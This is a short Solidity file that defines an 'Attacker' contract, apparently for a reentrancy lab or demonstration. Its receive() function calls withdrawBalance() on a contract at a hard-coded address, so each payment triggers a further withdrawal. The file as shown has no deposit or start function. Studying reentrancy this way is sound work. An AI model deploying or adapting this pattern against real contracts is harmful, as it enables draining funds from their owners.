pragma solidity ^0.8.17;

import "./Reentrancy.sol";

contract Attacker {
    Reentrancy reentrancyContract =
        Reentrancy(0xDAFEA492D9c6733ae3d56b7Ed1ADB60692c98Bc5);


    receive() external payable {
        reentrancyContract.withdrawBalance();
    }
}
